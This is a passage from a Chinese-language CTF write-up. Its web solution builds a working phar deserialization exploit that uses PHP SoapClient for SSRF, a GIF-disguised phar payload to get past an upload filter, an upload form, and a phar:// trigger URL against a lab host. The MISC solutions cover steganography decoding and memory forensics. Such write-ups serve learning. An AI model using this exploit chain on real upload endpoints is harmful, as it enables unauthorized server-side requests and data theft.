punctuation">&#125;</span></span></pre></td></tr></table></figure><p>这里提示了 flag.php 访问一下可以直接得到源码:</p>
<figure class="highlight php"><figcaption data-lang="PHP"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token php language-php"><span class="token delimiter important">&lt;?php</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'REMOTE_ADDR'</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string double-quoted-string">"127.0.0.1"</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="3"></td><td><pre>    <span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"flag.txt"</span><span class="token punctuation">,</span><span class="token variable">$flag</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token punctuation">&#125;</span></span></pre></td></tr></table></figure><p>分析:</p>
<ol>
<li>upload.php
<ol>
<li>文件类型为 <code>image/gif</code>  且不被正则 <code>&quot;/&lt;\?|php/i&quot;</code>  匹配到的时候会将文件上上传到 <code>storage/xxxxxxxx.gif</code></li>
<li>如果有 img 参数的时候会使用 <code>getimagesize</code>  函数获取图片信息</li>
</ol>
</li>
<li>config.php
<ol>
<li>只有一个类：Mysql</li>
<li>它的 connect 函数不可用，能利用的函数只有 <code>__destruct</code> , 在它里面调用了关闭连接的函数 <code>$this-&gt;conn-&gt;close();</code></li>
</ol>
</li>
<li>flag.php
<ol>
<li>这里会将 flag 复制到 flag.txt 中，但是必须本地访问才行</li>
</ol>
</li>
</ol>
<p>解题思路:</p>
<ol>
<li>首先明确最后目标：实现 <code>127.0.0.1</code>  访问 <code>flag.php</code></li>
<li>文件内容正则匹配 php 并且有 <code>getimagesize</code>  函数就很自然想到 phar 反序列化</li>
<li>反序列化什么类呢？这里给了 <code>Mysql</code>  类，就从它入手，结合最终目的 <code>SSRF</code>  想到原生类利用中的 <code>SoapClient</code> , 销毁函数会调用 <code>conn</code>  成员的 <code>close</code>  函数，就满足 <code>SoapClient</code>  的 <code>__call</code>  函数执行条件</li>
</ol>
<p>最终得到解题步骤:</p>
<ol>
<li>构造一个 Mysql 对象，让它的 <code>conn</code>  成员访问 <code>http://127.0.0.1/flag.php</code>  的 <code>SoapClient</code>  对象</li>
<li>将得到的对象放入 Phar 文件的 <code>Metadata</code>  数据段</li>
<li>为了绕过正则过滤，将原始的 phar 压缩为 <code>.tar.gz</code></li>
</ol>
<p>构造实现脚本:</p>
<figure class="highlight php"><figcaption data-lang="PHP"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token php language-php"><span class="token delimiter important">&lt;?php</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token keyword">class</span> <span class="token class-name-definition class-name">Mysql</span></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="4"></td><td><pre>    <span class="token keyword">public</span> <span class="token variable">$conn</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="5"></td><td><pre>    <span class="token keyword">public</span> <span class="token variable">$dbhost</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="6"></td><td><pre>    <span class="token keyword">public</span> <span class="token variable">$dbusername</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="7"></td><td><pre>    <span class="token keyword">public</span> <span class="token variable">$dbpasswd</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="8"></td><td><pre></pre></td></tr><tr><td data-num="9"></td><td><pre>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$conn</span><span class="token punctuation">,</span> <span class="token variable">$dbhost</span><span class="token punctuation">,</span> <span class="token variable">$dbusername</span><span class="token punctuation">,</span> <span class="token variable">$dbpasswd</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="10"></td><td><pre>    <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="11"></td><td><pre>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">conn</span> <span class="token operator">=</span> <span class="token variable">$conn</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="12"></td><td><pre>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">dbhost</span> <span class="token operator">=</span> <span class="token variable">$dbhost</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="13"></td><td><pre>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">dbusername</span> <span class="token operator">=</span> <span class="token variable">$dbusername</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="14"></td><td><pre>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">dbpasswd</span> <span class="token operator">=</span> <span class="token variable">$dbpasswd</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="15"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="16"></td><td><pre>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__destory</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="17"></td><td><pre>        @<span class="token function">system</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"calc"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="18"></td><td><pre>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">conn</span><span class="token operator">-></span><span class="token function">clase</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="19"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="20"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="21"></td><td><pre></pre></td></tr><tr><td data-num="22"></td><td><pre><span class="token variable">$soap</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">SoapClient</span><span class="token punctuation">(</span><span class="token constant">null</span><span class="token punctuation">,</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"location"</span><span class="token operator">=></span><span class="token string double-quoted-string">"http://127.0.0.1/flag.php"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"uri"</span><span class="token operator">=></span><span class="token string double-quoted-string">"http://127.0.0.1/flag.php"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="23"></td><td><pre><span class="token variable">$mysql</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">Mysql</span><span class="token punctuation">(</span></pre></td></tr><tr><td data-num="24"></td><td><pre>    <span class="token variable">$soap</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="25"></td><td><pre>    <span class="token string double-quoted-string">"xxx"</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="26"></td><td><pre>    <span class="token string double-quoted-string">"xxx"</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="27"></td><td><pre>    <span class="token string double-quoted-string">"xxx"</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="28"></td><td><pre><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="29"></td><td><pre></pre></td></tr><tr><td data-num="30"></td><td><pre></pre></td></tr><tr><td data-num="31"></td><td><pre><span class="token variable">$ser</span><span class="token operator">=</span><span class="token variable">$mysql</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="32"></td><td><pre>@<span class="token function">unlink</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"phar.gif"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="33"></td><td><pre><span class="token variable">$phar</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Phar</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"phar.phar"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="34"></td><td><pre><span class="token variable">$phar</span> <span class="token operator">=</span> <span class="token variable">$phar</span><span class="token operator">-></span><span class="token function">convertToExecutable</span><span class="token punctuation">(</span><span class="token class-name static-context">Phar</span><span class="token operator">::</span><span class="token constant">TAR</span><span class="token punctuation">,</span><span class="token class-name static-context">Phar</span><span class="token operator">::</span><span class="token constant">GZ</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="35"></td><td><pre><span class="token variable">$phar</span><span class="token operator">-></span><span class="token function">startBuffering</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="36"></td><td><pre><span class="token variable">$phar</span><span class="token operator">-></span><span class="token function">setStub</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"GIF89a&lt;?php __HALT_COMPILER(); ?>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="37"></td><td><pre><span class="token variable">$phar</span><span class="token operator">-></span><span class="token function">setMetadata</span><span class="token punctuation">(</span><span class="token variable">$ser</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="38"></td><td><pre><span class="token variable">$phar</span><span class="token operator">-></span><span class="token function">addFromString</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"f1ag.txt"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"f1ag&#123;PharData&#125;"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="39"></td><td><pre><span class="token variable">$phar</span><span class="token operator">-></span><span class="token function">stopBuffering</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="40"></td><td><pre>@<span class="token function">system</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"move phar.phar.tar.gz phar.gif"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="41"></td><td><pre>@<span class="token function">system</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"ls|findstr phar"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="42"></td><td><pre><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"phar://./phar.gif/f1ag.txt"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span></pre></td></tr></table></figure><p>运行上面脚本可以获得 <code>phar.gif</code>  并且输出里面的数据，然后可以看到生成的 phar.gif 并没有正则匹配的数据段</p>
<p>再写一个 form 表单向题目上传文件:</p>
<figure class="highlight html"><figcaption data-lang="HTML"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span> <span class="token attr-name">lang</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>en<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>http://192.168.166.147:58003/upload.php<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>name<span class="token punctuation">"</span></span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>post<span class="token punctuation">"</span></span> <span class="token attr-name">enctype</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>multipart/form-data<span class="token punctuation">"</span></span> <span class="token attr-name">target</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token punctuation">"</span></span><span class="token punctuation">></span></span></pre></td></tr><tr><td data-num="4"></td><td><pre>    file:<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>file<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>file<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></pre></td></tr><tr><td data-num="5"></td><td><pre>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span></pre></td></tr><tr><td data-num="6"></td><td><pre>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>提交<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></pre></td></tr><tr><td data-num="7"></td><td><pre><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span></pre></td></tr><tr><td data-num="8"></td><td><pre><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span></pre></td></tr><tr><td data-num="9"></td><td><pre><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span></pre></td></tr></table></figure><p><img loading="lazy" data-src="https://res.cloudinary.com/sycamore/image/upload/v1682444983/Typera/2023/04/928bc6b5a4b37ece34945ec48f050563.png" alt="image-20220619202551241" /></p>
<p>上传文件后自动跳转到题目的 <code>/upload.php</code>  下面，得到文件上传地址</p>
<p><img loading="lazy" data-src="https://res.cloudinary.com/sycamore/image/upload/v1682444983/Typera/2023/04/8604d2a808d2a95033b7e47354f02a32.png" alt="image-20220619202710848" /></p>
<p>然后使用 phar 协议加载这个文件地址即可触发反序列化</p>
<p><a target="_blank" rel="noopener" href="http://192.168.166.147:58003/upload.php?img=phar://./storage/ae08a63f.gif">http://192.168.166.147:58003/upload.php?img=phar://./storage/ae08a63f.gif</a></p>
<p><img loading="lazy" data-src="https://res.cloudinary.com/sycamore/image/upload/v1682444983/Typera/2023/04/857640a3f076370e147a02fa7830303b.png" alt="image-20220619203123372" /></p>
<p>最终会因为反序列化调用 <code>SoapClient</code>  访问 /flag.php 而将 flag 写入 flag.txt, 但是因为我们的文件格式并不是 gif 所以并不会满足 if 条件而输出 <code>go away hacker</code>  但是问题不大，此时去访问 flag.txt 即可得到 flag</p>
<p><a target="_blank" rel="noopener" href="http://192.168.166.147:58003/flag.txt">http://192.168.166.147:58003/flag.txt</a></p>
<p><img loading="lazy" data-src="https://res.cloudinary.com/sycamore/image/upload/v1682444984/Typera/2023/04/111191a5c9016190e8b5bcab43d52be6.png" alt="image-20220619203336153" /></p>
<h2 id=""><a class="anchor" href="#">#</a> </h2>
<h2 id="misc"><a class="anchor" href="#misc">#</a> MISC</h2>
<h3 id="pika"><a class="anchor" href="#pika">#</a> pika</h3>
<p><code>flag</code> ：flag{d6246d1f41fad032ee30193f3af15408}<br />
 lsb 隐写，RGB0 通道有异常，导出为一个 txt 文件。<br />
内容如下：</p>
<blockquote>
<p>cGkgcGkgcGkgcGkgcGkgcGkgcGkgcGkgcGkgcGkgcGlrYSBwaXBpIHBpIHBpcGkgcGkgcGkgcGkgcGlwaSBwaSBwaSBwaSBwaSBwaSBwaSBwaSBwaXBpIHBpIHBpIHBpIHBpIHBpIHBpIHBpIHBpIHBpIHBpIHBpY2h1IHBpY2h1IHBpY2h1IHBpY2h1IGthIGNodSBwaXBpIHBpcGkgcGlwaSBwaXBpIHBpIHBpIHBpa2FjaHUgcGkgcGkgcGkgcGkgcGkgcGkgcGlrYWNodSBrYSBrYSBrYSBrYSBrYSBrYSBrYSBrYSBrYSBrYSBrYSBwaWthY2h1IHBpIHBpIHBpIHBpIHBpIHBpIHBpa2FjaHUgcGkgcGkgcGkgcGkgcGkgcGkgcGkgcGkgcGkgcGkgcGkgcGkgcGkgcGkgcGkgcGkgcGkgcGkgcGkgcGkgcGlrYWNodSBrYSBrYSBrYSBrYSBrYSBrYSBrYSBrYSBrYSBrYSBrYSBrYSBrYSBrYSBrYSBrYSBrYSBrYSBrYSBrYSBrYSBrYSBrYSBwaWthY2h1IHBpY2h1IGthIGthIGthIGthIGthIGthIGthIGthIGthIGthIGthIGthIGthIGthIGthIGthIHBpa2FjaHUga2Ega2Ega2Ega2EgcGlrYWNodSBwaSBwaSBwaWthY2h1IHBpIHBpIHBpa2FjaHUgcGlwaSBwaWthY2h1IHBpY2h1IGthIGthIGthIGthIGthIHBpa2FjaHUgcGlwaSBwaSBwaSBwaWthY2h1IHBpY2h1IHBpIHBpIHBpIHBpa2FjaHUga2Ega2Ega2EgcGlrYWNodSBwaXBpIHBpa2FjaHUga2Ega2Ega2Ega2Ega2EgcGlrYWNodSBwaSBwaSBwaSBwaWthY2h1IHBpY2h1IGthIHBpa2FjaHUgcGkgcGkgcGkgcGlrYWNodSBrYSBwaWthY2h1IHBpcGkgcGkgcGlrYWNodSBwaWthY2h1IHBpY2h1IHBpIHBpa2FjaHUga2Ega2Ega2EgcGlrYWNodSBwaSBwaWthY2h1IHBpIHBpIHBpIHBpIHBpIHBpIHBpIHBpIHBpa2FjaHUga2Ega2Ega2Ega2Ega2Ega2EgcGlrYWNodSBwaXBpIHBpIHBpa2FjaHUgcGljaHUgcGlrYWNodSBwaXBpIGthIGthIGthIGthIGthIHBpa2FjaHUgcGkgcGkgcGkgcGkgcGkgcGlrYWNodSBwaWNodSBrYSBrYSBwaWthY2h1IHBpIHBpIHBpIHBpIHBpa2FjaHUga2EgcGlrYWNodSBrYSBrYSBrYSBrYSBwaWthY2h1IHBpIHBpIHBpIHBpIHBpIHBpIHBpIHBpIHBpa2FjaHUgcGlwaSBwaSBwaSBwaSBwaSBwaSBwaSBwaSBwaSBwaSBwaSBwaSBwaSBwaSBwaSBwaSBwaSBwaSBwaSBwaSBwaSBwaSBwaSBwaSBwaWthY2h1IA==</p>
</blockquote>
<p>base64 解密，得到：</p>
<blockquote>
<p>pi pi pi pi pi pi pi pi pi pi pika pipi pi pipi pi pi pi pipi pi pi pi pi pi pi pi pipi pi pi pi pi pi pi pi pi pi pi pichu pichu pichu pichu ka chu pipi pipi pipi pipi pi pi pikachu pi pi pi pi pi pi pikachu ka ka ka ka ka ka ka ka ka ka ka pikachu pi pi pi pi pi pi pikachu pi pi pi pi pi pi pi pi pi pi pi pi pi pi pi pi pi pi pi pi pikachu ka ka ka ka ka ka ka ka ka ka ka ka ka ka ka ka ka ka ka ka ka ka ka pikachu pichu ka ka ka ka ka ka ka ka ka ka ka ka ka ka ka ka pikachu ka ka ka ka pikachu pi pi pikachu pi pi pikachu pipi pikachu pichu ka ka ka ka ka pikachu pipi pi pi pikachu pichu pi pi pi pikachu ka ka ka pikachu pipi pikachu ka ka ka ka ka pikachu pi pi pi pikachu pichu ka pikachu pi pi pi pikachu ka pikachu pipi pi pikachu pikachu pichu pi pikachu ka ka ka pikachu pi pikachu pi pi pi pi pi pi pi pi pikachu ka ka ka ka ka ka pikachu pipi pi pikachu pichu pikachu pipi ka ka ka ka ka pikachu pi pi pi pi pi pikachu pichu ka ka pikachu pi pi pi pi pikachu ka pikachu ka ka ka ka pikachu pi pi pi pi pi pi pi pi pikachu pipi pi pi pi pi pi pi pi pi pi pi pi pi pi pi pi pi pi pi pi pi pi pi pi pikachu</p>
</blockquote>
<p>pikalang 解密网站：<a target="_blank" rel="noopener" href="https://www.dcode.fr/pikalang-language">https://www.dcode.fr/pikalang-language</a><br />
 解密得 flag</p>
<h3 id="内存中的secret"><a class="anchor" href="#内存中的secret">#</a> 内存中的 secret</h3>
<p>拿到两个文件， <code>secret.raw</code>  和  <code>yuijm0-=pkl;</code></p>
<p>用 volatility 扫描 <code>secret.raw</code> ： <code>volatility -f secret.raw imageinfo</code> ，得到：</p>
<blockquote>
<p>Suggested Profile(s) : Win10x64_14393, Win10x64_10586, Win10x64, Win2016x64_14393</p>
</blockquote>
<p>是一个内存镜像文件，同时获得内存的操作系统类型及版本</p>
<p>使用 AXIOM 分析内存镜像文件，镜像配置文件直接选择  <code>Win10x64_14393</code> ：<br />
<img loading="lazy" data-src="https://res.cloudinary.com/sycamore/image/upload/v1682445061/Typera/2023/04/e34c8c2bc8f3779902c6fc3ef8d6d26f.png" alt="image-20230426015056726" /></p>
<p>AXIOM 分析完毕后，先好好地翻一翻，看看都有啥。<br />
使用痕迹 --&gt; 操作系统 --&gt; Windows 时间线活动，能找到不少 VeraCrypt 的运行痕迹：<br />
<img loading="lazy" data-src="https://res.cloudinary.com/sycamore/image/upload/v1682445044/Typera/2023/04/3c5e8d2335b4749ed416a8374458b0d1.png" alt="image-20230426015040521" /></p>
<p>使用痕迹 --&gt; web 相关，对日期做降序排序之后，能看到不少文件记录，<br />
值得注意的有：几个虚拟磁盘文件，很可疑的 flag.txt.txt，BitLocker 恢复密钥，decrypt.png，secret.zip<br />
<img loading="lazy" data-src="https://res.cloudinary.com/sycamore/image/upload/v1682445040/Typera/2023/04/858e96afc434419d85425864be03a11b.png" alt="image-20230426015035954" /><br />
 使用痕迹 --&gt; 加密，能看到 5 个 BitLocker 恢复密钥文件，其中四个恢复密钥部分内容完整，且包含有三个不同的恢复密钥，如下：<br />
 <code>109703-115929-085558-382888-715638-661716-466774-220858</code> <br />
 <code>172612-531773-032945-133364-584639-681373-481602-511291</code> <br />
 <code>109703-115929-085558-382888-715638-661716-466774-233200</code></p>
<p>结合 VeraCrypt 的运行痕迹，猜测 <code>yuijm0-=pkl;</code>  应该是一个磁盘文件，大概需要使用 VeraCrypt 进行挂载，<br />
web 相关中得到的几个可以文件，应该与挂载之后的步骤有关联，<br />
几个 BitLocker 恢复密钥，应该是需要我们使用恢复密钥，解开后面得到的某个文件。</p>
<p>结合所给的提示：键盘密码，发现该文件的文件名很有特点，其轨迹如下：<br />
<img loading="lazy" data-src="https://res.cloudinary.com/sycamore/image/upload/v1682445035/Typera/2023/04/e5efed00ab6006e2ec2efbfeb24d0dbf.png" alt="image-20230426015029743" /></p>
<p>可以看出，应该是 TZ，推测挂载需使用的密码应该就是这个。<br />
成功将磁盘文件挂载到本地后，得到一个虚拟磁盘文件： <code>encrypt.vhd</code></p>
<p>打开 DiskGenius，磁盘 --&gt; 打开虚拟磁盘文件，选择上一步得到的文件，<br />
是使用 BitLocker 加密的：<br />
<img loading="lazy" data-src="https://res.cloudinary.com/sycamore/image/upload/v1682445028/Typera/2023/04/f84d4415570a55914af21382e4c88d08.png" alt="image-20230426015024693" /></p>
<p>依次尝试之前获得的三个恢复密钥，可以成功解开，获得  <code>decrypt.png</code>  和 <code>secret.zip</code> ：<br />
<img loading="lazy" data-src="https://res.cloudinary.com/sycamore/image/upload/v1682445027/Typera/2023/04/6a6c5ab814e6d331f41a18998a8a6ff8.png" alt="image-20230426015019970" /></p>
<p>其中， <code>secret.zip</code>  被加密，结合文件名推测 <code>decrypt,png</code>  应该包含密码。<br />
<img loading="lazy" data-src="https://res.cloudinary.com/sycamore/image/upload/v1682445026/Typera/2023/04/70720bc6a39d9eab22e5f340a1829e4c.png" alt="image-20230426015015401" /></p>
<p>文字提示：致敬 babydisk，可以联想到初赛的那道题，查看 wp 后获得关键词<strong>螺旋</strong>。<br />
尝试后得到密码为：从右上角开始，按顺时针旋转的顺序列出偏旁： <code>⼃⼇⼋⼏⼎⼍⼌⼈⼄⼀⼁⼂⼆⼊⼉⼅</code> <br />
直接复制维基的 Unicode，使用 7z 解才成功<br />
（必须注意字符的问题，手打出来的偏旁，可能因为输入法的原因，无论如何也解不出来）</p>
<p>解得 flag.txt 内容如下：<br />
<img loading="lazy" data-src="https://res.cloudinary.com/sycamore/image/upload/v1682445014/Typera/2023/04/3a481abbd31dbb4dba5468a45f209de5.png" alt="image-20230426015010492" /></p>
<p>用脚本解密：</p>
<figure class="highlight python"><figcaption data-lang="python"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token keyword">import</span> base64</pre></td></tr><tr><td data-num="2"></td><td><pre></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token keyword">def</span> <span class="token function">base64stego_decrypt</span><span class="token punctuation">(</span>lines<span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="4"></td><td><pre>    base64char <span class="token operator">=</span> <span class="token string">"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"</span>     </pre></td></tr><tr><td data-num="5"></td><td><pre>    bintext <span class="token operator">=</span> <span class="token string">""</span></pre></td></tr><tr><td data-num="6"></td><td><pre>    <span class="token keyword">for</span> line <span class="token keyword">in</span> lines<span class="token punctuation">:</span></pre></td></tr><tr><td data-num="7"></td><td><pre>        <span class="token keyword">if</span> line<span class="token punctuation">.</span>find<span class="token punctuation">(</span><span class="token string">"=="</span><span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="8"></td><td><pre>            tmp <span class="token operator">=</span> <span class="token builtin">bin</span><span class="token punctuation">(</span>base64char<span class="token punctuation">.</span>find<span class="token punctuation">(</span>line<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">15</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">]</span></pre></td></tr><tr><td data-num="9"></td><td><pre>            bintext <span class="token operator">=</span> bintext<span class="token operator">+</span><span class="token string">"0"</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token number">4</span><span class="token operator">-</span><span class="token builtin">len</span><span class="token punctuation">(</span>tmp<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">+</span>tmp</pre></td></tr><tr><td data-num="10"></td><td><pre>        <span class="token keyword">elif</span> line<span class="token punctuation">.</span>find<span class="token punctuation">(</span><span class="token string">"="</span><span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="11"></td><td><pre>            tmp <span class="token operator">=</span> <span class="token builtin">bin</span><span class="token punctuation">(</span>base64char<span class="token punctuation">.</span>find<span class="token punctuation">(</span>line<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">]</span></pre></td></tr><tr><td data-num="12"></td><td><pre>            bintext <span class="token operator">=</span> bintext<span class="token operator">+</span><span class="token string">"0"</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token operator">-</span><span class="token builtin">len</span><span class="token punctuation">(</span>tmp<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">+</span>tmp</pre></td></tr><tr><td data-num="13"></td><td><pre>    text <span class="token operator">=</span> <span class="token string">""</span></pre></td></tr><tr><td data-num="14"></td><td><pre>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>bintext<span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">8</span> <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="15"></td><td><pre>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"error"</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="16"></td><td><pre>        <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token builtin">len</span><span class="token punctuation">(</span>bintext<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="17"></td><td><pre>            <span class="token keyword">if</span><span class="token punctuation">(</span>i<span class="token operator">+</span><span class="token number">8</span> <span class="token operator">></span> <span class="token builtin">len</span><span class="token punctuation">(</span>bintext<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="18"></td><td><pre>                text <span class="token operator">=</span> text<span class="token operator">+</span><span class="token string">"-"</span><span class="token operator">+</span>bintext<span class="token punctuation">[</span>i<span class="token punctuation">:</span><span class="token punctuation">]</span></pre></td></tr><tr><td data-num="19"></td><td><pre>                <span class="token keyword">return</span> text</pre></td></tr><tr><td data-num="20"></td><td><pre>            <span class="token keyword">else</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="21"></td><td><pre>                text <span class="token operator">=</span> text<span class="token operator">+</span><span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>bintext<span class="token punctuation">[</span>i<span class="token punctuation">:</span>i<span class="token operator">+</span><span class="token number">8</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="22"></td><td><pre>    <span class="token keyword">else</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="23"></td><td><pre>        <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token builtin">len</span><span class="token punctuation">(</span>bintext<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token 